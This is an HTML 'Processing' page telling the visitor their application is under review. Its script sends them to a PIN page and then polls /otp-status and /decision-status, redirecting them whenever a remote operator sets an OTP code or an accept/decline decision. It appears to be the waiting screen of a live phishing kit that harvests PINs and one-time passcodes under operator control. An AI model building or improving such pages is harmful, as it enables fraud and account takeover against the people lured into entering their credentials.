<!DOCTYPE html>
<html>

<head>
    <title>Processing</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">

    <link rel="stylesheet" href="style.css">
</head>

<body>

<div class="header"></div>

<div class="container">

    <h2 class="title">Processing...</h2>

    <div class="loader"></div>

    <p style="text-align:center; margin-top:20px;">
        Please wait while we review your application
    </p>

</div>

<div class="footer"></div>

<script>

// FIRST PROCESS → go to PIN page
if (localStorage.getItem("firstProcess") === "yes") {
    localStorage.removeItem("firstProcess");

    setTimeout(() => {
        window.location.href = "step5.html";
    }, 5000);
}

// SECOND PROCESS → wait for OTP / decision
if (localStorage.getItem("fromPin") === "yes") {

    setInterval(async () => {

        try {
            const otpRes = await fetch("/otp-status?nocache=" + Date.now());
            const otpData = await otpRes.json();

            console.log("OTP:", otpData);

            if (otpData.otp === 5) {
    await fetch("/set-otp", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ otp: null })
    });

    window.location.href = "step5.html";
}

            if (otpData.otp === 6) {
    await fetch("/set-otp", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ otp: null })
    });

    window.location.href = "step6.html";
}

            const decisionRes = await fetch("/decision-status?nocache=" + Date.now());
            const decisionData = await decisionRes.json();

            console.log("DECISION:", decisionData);

            if (decisionData.decision === "accept") {
                window.location.href = "dashboard.html";
            }

            if (decisionData.decision === "decline") {
                window.location.href = "index.html";
            }

        } catch (err) {
            console.log("Waiting...");
        }

    }, 2000);
}

</script>

</body>
</html>
